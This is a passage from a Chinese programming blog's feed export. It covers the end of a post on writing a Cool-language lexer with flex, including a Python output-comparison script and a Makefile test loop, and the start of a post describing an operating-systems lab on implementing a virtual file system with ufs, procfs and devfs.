class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*字符串相关的Condition*/</span></span><br><span class="line">%x string</span><br><span class="line"></span><br><span class="line">%%</span><br><span class="line"></span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment">  *  String constants (C syntax)</span></span><br><span class="line"><span class="comment">  *  Escape sequence \c is accepted for all characters c. Except for </span></span><br><span class="line"><span class="comment">  *  \n \t \b \f, the result is c.</span></span><br><span class="line"><span class="comment">  *</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">\<span class="string">&quot;                              &#123;</span></span><br><span class="line"><span class="string">  string_buf_ptr = string_buf;</span></span><br><span class="line"><span class="string">  BEGIN(string);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&lt;string&gt;&lt;&lt;EOF&gt;&gt;                 &#123;</span></span><br><span class="line"><span class="string">  BEGIN(INITIAL);</span></span><br><span class="line"><span class="string">  cool_yylval.error_msg = &quot;</span>EOF in string constant<span class="string">&quot;;</span></span><br><span class="line"><span class="string">  return ERROR;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&lt;string&gt;\\\n                    &#123;++curr_lineno;&#125;</span></span><br><span class="line"><span class="string">&lt;string&gt;\\b                     &#123;</span></span><br><span class="line"><span class="string">  if((string_buf_ptr - string_buf) &gt; MAX_STR_CONST) &#123;</span></span><br><span class="line"><span class="string">    BEGIN(INITIAL);</span></span><br><span class="line"><span class="string">    cool_yylval.error_msg = &quot;</span>String <span class="type">const</span> too <span class="type">long</span><span class="string">&quot;;</span></span><br><span class="line"><span class="string">    return ERROR;</span></span><br><span class="line"><span class="string">  &#125;else &#123;*(string_buf_ptr++) = &#x27;\b&#x27;;&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&lt;string&gt;\\t                     &#123;</span></span><br><span class="line"><span class="string">  if((string_buf_ptr - string_buf) &gt; MAX_STR_CONST) &#123;</span></span><br><span class="line"><span class="string">    BEGIN(INITIAL);</span></span><br><span class="line"><span class="string">    cool_yylval.error_msg = &quot;</span>String <span class="type">const</span> too <span class="type">long</span><span class="string">&quot;;</span></span><br><span class="line"><span class="string">    return ERROR;</span></span><br><span class="line"><span class="string">  &#125;else &#123;*(string_buf_ptr++) = &#x27;\t&#x27;;&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&lt;string&gt;\\n                     &#123;</span></span><br><span class="line"><span class="string">  if((string_buf_ptr - string_buf) &gt; MAX_STR_CONST) &#123;</span></span><br><span class="line"><span class="string">    BEGIN(INITIAL);</span></span><br><span class="line"><span class="string">    cool_yylval.error_msg = &quot;</span>String <span class="type">const</span> too <span class="type">long</span><span class="string">&quot;;</span></span><br><span class="line"><span class="string">    return ERROR;</span></span><br><span class="line"><span class="string">  &#125;else &#123;*(string_buf_ptr++) = &#x27;\n&#x27;;&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&lt;string&gt;\\f                     &#123;</span></span><br><span class="line"><span class="string">  if((string_buf_ptr - string_buf) &gt; MAX_STR_CONST) &#123;</span></span><br><span class="line"><span class="string">    BEGIN(INITIAL);</span></span><br><span class="line"><span class="string">    cool_yylval.error_msg = &quot;</span>String <span class="type">const</span> too <span class="type">long</span><span class="string">&quot;;</span></span><br><span class="line"><span class="string">    return ERROR;</span></span><br><span class="line"><span class="string">  &#125;else &#123;*(string_buf_ptr++) = &#x27;\f&#x27;;&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&lt;string&gt;\\0                     &#123;</span></span><br><span class="line"><span class="string">  BEGIN(INITIAL);</span></span><br><span class="line"><span class="string">  cool_yylval.error_msg = &quot;</span>String contains null character<span class="string">&quot;;</span></span><br><span class="line"><span class="string">  return ERROR;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&lt;string&gt;\\.                     &#123;</span></span><br><span class="line"><span class="string">  if((string_buf_ptr - string_buf) &gt; MAX_STR_CONST) &#123;</span></span><br><span class="line"><span class="string">    BEGIN(INITIAL);</span></span><br><span class="line"><span class="string">    cool_yylval.error_msg = &quot;</span>String <span class="type">const</span> too <span class="type">long</span><span class="string">&quot;;</span></span><br><span class="line"><span class="string">    return ERROR;</span></span><br><span class="line"><span class="string">  &#125;else &#123;*(string_buf_ptr++) = yytext[1];&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&lt;string&gt;\n                      &#123;</span></span><br><span class="line"><span class="string">  BEGIN(INITIAL);</span></span><br><span class="line"><span class="string">  cool_yylval.error_msg = &quot;</span>Unterminated string constant<span class="string">&quot;;</span></span><br><span class="line"><span class="string">  return ERROR;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&lt;string&gt;\&quot;                      &#123;</span></span><br><span class="line"><span class="string">  BEGIN(INITIAL);</span></span><br><span class="line"><span class="string">  cool_yylval.symbol = stringtable.add_string(string_buf, string_buf_ptr - string_buf);</span></span><br><span class="line"><span class="string">  return STR_CONST;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&lt;string&gt;.                       &#123;</span></span><br><span class="line"><span class="string">  if((string_buf_ptr - string_buf) &gt; MAX_STR_CONST) &#123;</span></span><br><span class="line"><span class="string">    BEGIN(INITIAL);</span></span><br><span class="line"><span class="string">    cool_yylval.error_msg = &quot;</span>String <span class="type">const</span> too <span class="type">long</span><span class="string">&quot;;</span></span><br><span class="line"><span class="string">    return ERROR;</span></span><br><span class="line"><span class="string">  &#125;else &#123;*(string_buf_ptr++) = yytext[0];&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure></li></ol><h3 id="有效字符"><a href="#有效字符" class="headerlink" title="有效字符"></a>有效字符</h3><p>  最后，我们保留<strong>Cool</strong>中有效的单个字符——<code>.</code>、<code>+</code>、<code>-</code>、<code>*</code>、<code>/</code>、<code>(</code>、<code>)</code>、<code>&#123;</code>、<code>&#125;</code>、<code>；</code>、<code>:</code>、<code>，</code>、<code>=</code>、<code>&lt;</code>、<code>~</code>和<code>@</code></p><p>  剩余如果没有匹配上，则证明其是非常词素，则直接抛出异常即可</p>  <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment">  * 处理其余可能的单个字符情况</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">[\.\+\-\*/\(\)\&#123;\&#125;;:,=&lt;~@]      &#123;<span class="keyword">return</span> yytext[<span class="number">0</span>];&#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment">  * 剩余单个字符就是无效字符</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">.                               &#123;</span><br><span class="line">  <span class="built_in">sprintf</span>(string_buf, <span class="string">&quot;%c&quot;</span>, yytext[<span class="number">0</span>]);</span><br><span class="line">  cool_yylval.error_msg = string_buf;</span><br><span class="line">  <span class="keyword">return</span> ERROR;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h2><h3 id="cmp-py"><a href="#cmp-py" class="headerlink" title="cmp.py"></a>cmp.py</h3><p>  为了观察自己实现的词法解析程序的效果，通过与标准的词法解析器的输出进行比较来实现</p><p>  即通过正则表达式获取自己实现的词法解析器和标准的词法解析器对于同一个源程序的解析结果，并进行对比即可<br>  程序的源代码如下所示<br>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">参数1：            path         字符串，表明要读取的文件路径</span></span><br><span class="line"><span class="string">返回值：                        列表，每一个元素表示一行的信息</span></span><br><span class="line"><span class="string">读取制定文件的词法解析结果</span></span><br><span class="line"><span class="string">即通过正则表达式，读取#[0-9]+ (.*)的的输入即可，其每一行的信息为(行号，内容)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_lexical_result</span>(<span class="params">path</span>):</span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path) <span class="keyword">as</span> f:</span><br><span class="line">        lines = f.readlines()</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">            result = re.<span class="keyword">match</span>(<span class="string">r&#x27;#([0-9]+) (.*)$&#x27;</span>, line)</span><br><span class="line">            <span class="keyword">if</span>(result):</span><br><span class="line">                res.append([result.group(<span class="number">1</span>), result.group(<span class="number">2</span>)])</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">len</span>(sys.argv) &lt; <span class="number">4</span>):</span><br><span class="line">        exit(-<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        sys.argv[1]表示原始文件名称</span></span><br><span class="line"><span class="string">        sys.argv[2]表示标准词法解析器的结果</span></span><br><span class="line"><span class="string">        sys.argv[3]表示自己实现的词法解析器的结果</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    lexer_output = read_lexical_result(sys.argv[<span class="number">2</span>])</span><br><span class="line">    mylexer_output = read_lexical_result(sys.argv[<span class="number">3</span>])</span><br><span class="line"></span><br><span class="line">    same_number = <span class="number">0</span></span><br><span class="line">    diff_result = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(lexer_output)):</span><br><span class="line">        <span class="keyword">if</span>(lexer_output[i][<span class="number">1</span>] == mylexer_output[i][<span class="number">1</span>]):</span><br><span class="line">            same_number += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            diff_result.append([mylexer_output[i][<span class="number">0</span>], lexer_output[i][<span class="number">1</span>], mylexer_output[i][<span class="number">1</span>]])</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\033[32;1m%s: %d/%d\033[0m&quot;</span>%(sys.argv[<span class="number">1</span>], same_number, <span class="built_in">len</span>(lexer_output)))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(diff_result)):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;#%s: \033[32;1mlexer_output: %s; \033[31;1mmylexer_output: %s\033[0m&#x27;</span>%(diff_result[i][<span class="number">0</span>], diff_result[i][<span class="number">1</span>], diff_result[i][<span class="number">2</span>]))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure></p><h3 id="Makefile"><a href="#Makefile" class="headerlink" title="Makefile"></a>Makefile</h3><p>  然后更改<strong>Makefile</strong>中的<strong>doteset</strong>目标<br>  分别调用自己实现的词法解析器和标准的词法解析器，处理<strong>./*cl</strong>和<strong>../../examples/*cl</strong>，并调用前面实现的<strong>cmp.py</strong>，比较输出结果，从而进行测试</p><p>  修改的<strong>Makefile</strong>目标如下所示<br>  <figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">dotest:lexer test.cl</span></span><br><span class="line">for file in $<span class="variable">$(find ../../examples/*.cl; find ./*.cl)</span>; do \</span><br><span class="line">basename=$<span class="variable">$(echo $$<span class="built_in">file</span> | awk -F / &#x27;&#123;print $$NF&#125;&#x27; | awk -F . &#x27;&#123;print $$1&#125;&#x27;)</span>; \</span><br><span class="line">../../bin/lexer $$file &gt; lexer.$$basename.out; \</span><br><span class="line">./lexer $$file &gt; mylexer.$$basename.out; \</span><br><span class="line">python3 cmp.py $$basename lexer.$$basename.out mylexer.$$basename.out; \</span><br><span class="line">done</span><br></pre></td></tr></table></figure></p><p>  最终，其运行结果如下所示<br>  <img src="实验结果.png" alt="实验结果"></p><p>  其中，标红部分表示自己实现的词法解析器和标准的词法解析器解析的结果不同<br>  但是，实际上这部分按照实验指导的规则，应该和自己实现的词法解析器结果相同，这里就不需要在查看了</p>]]></content>
      
      
      <categories>
          
          <category> 手写 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 手写 </tag>
            
            <tag> 编译原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统-设计与实现-九</title>
      <link href="/2021/12/15/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0-%E4%B9%9D/"/>
      <url>/2021/12/15/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E8%AE%BE%E8%AE%A1%E4%B8%8E%E5%AE%9E%E7%8E%B0-%E4%B9%9D/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>  这个系列终于到最后一篇博客了。<br>  感慨颇深!</p><h1 id="L3-虚拟文件系统-vfs"><a href="#L3-虚拟文件系统-vfs" class="headerlink" title="L3 虚拟文件系统(vfs)"></a>L3 虚拟文件系统(vfs)</h1><h2 id="实验背景"><a href="#实验背景" class="headerlink" title="实验背景"></a>实验背景</h2><p>  在这个实验中，我们在多处理器分时多线程的基础上，实现<strong>线程安全</strong>的虚拟文件系统(virtual file system, VFS)API，并且在VFS这一抽象层上实现若干不同的文件系统：</p><ul><li>在存储设备(sda)上支持完整文件和目录操作的文件系统<strong>ultra-simple file system(ufs)</strong></li><li>虚拟的procfs，提供一系列只读的、反映操作系统内部状态的文件</li><li><p>虚拟的devfs，将操作系统中的设备抽象为可以访问的文件，并为这些文件提供读写操作</p><p>实现完成后，系统中的多个线程就可以通过这些文件系统API，进行读写文件操作——至此离现代操作系统就只有一步之遥：只需要为每个线程附属一个独立的地址空间(通过虚拟存储实现)，线程就变成了熟知的进程，操作系统就完整了。</p></li></ul><h2 id="实验描述"><a href="#实验描述" class="headerlink" title="实验描述"></a>实验描述</h2><blockquote><h3 id="实验总览"><a href="#实验总览" class="headerlink" title="实验总览"></a>实验总览</h3><p>这个实验在<strong>pmm</strong>和<strong>kmt</strong>的基础上，在磁盘设备(驱动程序)的基础上实现持久的文件系统，并且在线程级别支持文件描述符和文件/目录操作API——vfs的API和MiniLabs中使用的系统调用几乎完全一样——在Linux中，进程通过<strong>syscall</strong>进入操作系统后会直接调用这些函数</p><blockquote><p><strong>注意：本实验需要设备驱动程序部分正常工作</strong><br>在Lab3中，需要合并Lab2的官方测试用例(dev以及若干设备驱动的实现)。但即便kmt的实现有问题(例如终端设备在时钟作用下有一定的异常)，可以通过尝试注释掉线程创建的代码和中断处理程序的注册，从而进行调试</p></blockquote><p>本实验的文件系统API做了相当的简化，例如不支持动态的<strong>mount</strong>(文件系统在系统启动时被mount)。具体来说，需要实现以下的API</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ufs_stat</span>;</span></span><br><span class="line">MODULE(vfs) &#123;</span><br><span class="line"> <span class="type">void</span> (*init)();</span><br><span class="line"> <span class="type">int</span> (*write)(<span class="type">int</span> fd, <span class="type">void</span> *buf, <span class="type">int</span> count);</span><br><span class="line"> <span class="type">int</span> (*read)(<span class="type">int</span> fd, <span class="type">void</span> *buf, <span class="type">int</span> count);</span><br><span class="line"> <span class="type">int</span> (*close)(<span class="type">int</span> fd);</span><br><span class="line"> <span class="type">int</span> (*open)(<span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">int</span> flags);</span><br><span class="line"> <span class="type">int</span> (*lseek)(<span class="type">int</span> fd, <span class="type">int</span> offset, <span class="type">int</span> whence);</span><br><span class="line"> <span class="type">int</span> (*link)(<span class="type">const</span> <span class="type">char</span> *oldpath, <span class="type">const</span> <span class="type">char</span> *newpath);</span><br><span class="line"> <span class="type">int</span> (*unlink)(<span class="type">const</span> <span class="type">char</span> *pathname);</span><br><span class="line"> <span class="type">int</span> (*fstat)(<span class="type">int</span> fd, <span class="keyword">struct</span> ufs_stat *buf);</span><br><span class="line"> <span class="type">int</span> (*mkdir)(<span class="type">const</span> <span class="type">char</span> *pathname);</span><br><span class="line"> <span class="type">int</span> (*chdir)(<span class="type">const</span> <span class="type">char</span> *path);</span><br><span class="line"> <span class="type">int</span> (*dup)(<span class="type">int</span> fd);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>注意到本实验的框架中还提供了framework/user.h，这个文件是用户进程(假想有的话)/内核之间共享的，其定义了诸如<code>struct ufs_stat</code>，以及若干函数参数的含义，和目录文件的格式。例如<strong>whence</strong>中的<strong>SEEK_SET</strong>、<strong>SEEK_CUR</strong>和<strong>SEEK_END</strong>：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> T_DIR     1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> T_FILE    2</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SEEK_CUR  0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SEEK_SET  1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SEEK_END  2</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> O_RDONLY  00000000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> O_WRONLY  00000001</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> O_RDWR    00000002</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> O_CREAT   00000100</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ufs_stat</span> &#123;</span></span><br><span class="line"> <span class="type">uint32_t</span> id, type, size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ufs_dirent</span> &#123;</span></span><br><span class="line"> <span class="type">uint32_t</span> inode;</span><br><span class="line"> <span class="type">char</span> name[<span class="number">28</span>];</span><br><span class="line">&#125; __attribute__((packed));</span><br></pre></td></tr></table></figure><br>请不要修改上述框架中的定义，但文件系统的数据结构设计、县城同步等，都可以自由发挥！虽然文件系统的实现原理简单，但实现文件系统的工作量足够大(而且要小心处理很多对象的生命周期和error handling)，请做好调试代码的心理准备</p><h3 id="VFS-Virtual-File-System-模块"><a href="#VFS-Virtual-File-System-模块" class="headerlink" title="VFS(Virtual File System)模块"></a>VFS(Virtual File System)模块</h3><blockquote><p><strong>线程安全性</strong><br>注意，除了模块的初始化(init)之外，系统中创建的线程都可以并发地访问操作系统中的对象——但注意每个线程都有一份文件描述符的副本</p></blockquote><h4 id="模块初始化"><a href="#模块初始化" class="headerlink" title="模块初始化"></a>模块初始化</h4><p><strong>vfs-&gt;init()</strong>负责初始化必要的数据，例如根文件系统的创建等。本实验预期会在<strong>os-&gt;init()</strong>时调用<strong>vfs-&gt;init()</strong>。整个系统启动只调用一次<strong>vfs-&gt;init()</strong></p><h4 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h4><p>在Lab3中，实验需要实现树状的目录结构，三个文件系统的实现：</p><ul><li>通过<strong>/</strong>，访问ufs，ufs管理磁盘设备<strong>sda</strong>。ufs支持文件系统内的链接(linking)</li><li>通过<strong>/proc</strong>可以访问procfs。procfs为每一个线程(之后的进程)创建一个目录，目录中可以提供该线程(进程)的信息，例如可以通过<strong>/proc/1/name</strong>来获取线程的名称</li><li>实验预期通过<strong>/dev</strong>访问devfs，例如通过<strong>/dev/sda</strong>，用文件系统API直接读写磁盘上的数据</li></ul><p>可以理解为，实验中的<strong>vfs-&gt;init()</strong>需要完成<strong>/proc</strong>和<strong>/dev</strong>的挂载——但不需要实现<strong>mount/unmoount</strong>的API，因此可以在适当的时候“硬编码”，以减少代码的复杂度。<br>文件系统的目录树看起来和<strong>Linux</strong>有一定的相似性(红色的节点表示目录，黑色的节点表示文件，三角形表示文件系统)<br><img src="vfs的目录树.png" alt="vfs的目录树"></p><h4 id="路径与文件描述符"><a href="#路径与文件描述符" class="headerlink" title="路径与文件描述符"></a>路径与文件描述符</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> (*chdir)(<span class="type">const</span> <span class="type">char</span> *path);</span><br><span class="line"><span class="type">int</span> (*open)(<span class="type">const</span> <span class="type">char</span> *pathname, <span class="type">int</span> flags);</span><br><span class="line"><span class="type">int</span> (*close)(<span class="type">int</span> fd);</span><br></pre></td></tr></table></figure><p>在本实验的操作系统中，每个线程都有一个“当前目录”，指向文件系统中的一个存在的目录(假设实验中不会删除任何进程的当前目录，虽然实际的系统中在这种情况下有defined behavior)。之后的线程执行所有的API(<strong>chdir</strong>,<strong>open</strong>，<strong>read</strong>，<strong>link</strong>，<strong>unlink</strong>，<strong>mkdir</strong>)时，如果路径不是以<strong>/</strong>开头，则相对于当前路径进行路径解析。例如，如果当前目录是<strong>/proc</strong>，那么<strong>1/name</strong>就是一个合法的路径(指向<strong>/proc/1/name</strong>)</p><ul><li><strong>chdir</strong>改变当前线程的当前路径为<strong>path</strong>；成功返回0</li><li><strong>open</strong>打开<strong>path</strong>，允许的打开方式<strong>flags</strong>定义在<strong>user.h</strong>:<ul><li><strong>O_RDONLY</strong>：只读</li><li><strong>O_WDONLY</strong>：只写</li><li><strong>O_RDWR</strong>：可读可写</li><li><strong>O_CREATE</strong>：如果文件不存在则创建<br>如果打开成功，返回一个非负整数编号的文件描述符(最小的未使用的文件描述符)。文件描述符是指向操作系统对象的指针，并且可以通过文件描述符访问这个对象</li></ul></li><li><strong>close</strong>关闭一个文件描述符</li></ul><blockquote><p><strong>与UNIX文件系统的区别</strong><br>注意允许<strong>open</strong>以只读的方式打开目录文件。在本系统的<strong>ufs</strong>中，目录文件以二进制形式存储<strong>struct ufs_dirent</strong>的数组中，从而可以获得目录中文件的列表，从而无需<strong>readdir(getdents)</strong>系统调用</p></blockquote><h4 id="目录和文件操作"><a href="#目录和文件操作" class="headerlink" title="目录和文件操作"></a>目录和文件操作</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> (*mkdir)(<span class="type">const</span> <span class="type">char</span> *pathname);</span><br><span class="line"><span class="type">int</span> (*link)(<span class="type">const</span> <span class="type">char</span> *oldpath, <span class="type">const</span> <span class="type">char</span> *newpath);</span><br><span class="line"><span class="type">int</span> (*unlink)(<span class="type">const</span> <span class="type">char</span> *pathname);</span><br><span class="line"><span class="type">int</span> (*fstat)(<span class="type">int</span> fd, <span class="keyword">struct</span> ufs_stat *buf);</span><br></pre></td></tr></table></figure><ul><li>目录管理的API是<strong>mkdir</strong>(创建目录)、<strong>link</strong>(创建文件的链接)、<strong>unlink</strong>(删除链接)，行为和Linux/教科书保持一致，注意路径名如果不是以<strong>/</strong>开头，需要以当前线程的工作目录进行相对解析。注意只有磁盘上持久的文件系统支持链接——不需要为<strong>procfs</strong>或<strong>devfs</strong>支持链接</li><li>对一个打开的文件，可以使用<strong>fstat</strong>查看文件的属性，<strong>struct ufs_stat</strong>定义在<strong>user.h</strong>：<ul><li>id是编号(&gt;=1)</li><li>type是T_DIR(目录)或T_FILE(文件)，其他数值为非法</li><li>size是文件大小的字节数。对于目录文件(目录项的数组)，大小总是<strong>struct ufs_dirent</strong>大小的整数倍</li></ul></li></ul><h4 id="文件描述符操作"><a href="#文件描述符操作" class="headerlink" title="文件描述符操作"></a>文件描述符操作</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> (*write)(<span class="type">int</span> fd, <span class="type">void</span> *buf, <span class="type">int</span> count);</span><br><span class="line"><span class="type">int</span> (*read)(<span class="type">int</span> fd, <span class="type">void</span> *buf, <span class="type">int</span> count);</span><br><span class="line"><span class="type">int</span> (*lseek)(<span class="type">int</span> fd, <span class="type">int</span> offset, <span class="type">int</span> whence);</span><br><span class="line"><span class="type">int</span> (*dup)(<span class="type">int</span> fd);</span><br></pre></td></tr></table></figure><p>把文件描述符看成是访问操作系统对象的“指针”，文件描述符上的操作就非常容易理解：<strong>read</strong>、<strong>write</strong>会从文件描述符内置的游标(offset)中读取数据，并相应更新offset，<strong>leek</strong>会改变游标的位置，其中<strong>whence(user.h)</strong>：</p><ul><li><strong>SEEK_CUR</strong>：从当前位置开始</li><li><strong>SEEK_SET</strong>：从头部开始</li><li><strong>SEEK_END</strong>：从尾部开始。此时<strong>offset</strong>为0将会读到<strong>EOF(end-of-file)</strong></li></ul><p><strong>dup</strong>复制一份共享<strong>offset</strong>的文件描述符，返回最小可用的文件描述符。这些行为都和Linux一致</p><h4 id="挂载的文件系统"><a href="#挂载的文件系统" class="headerlink" 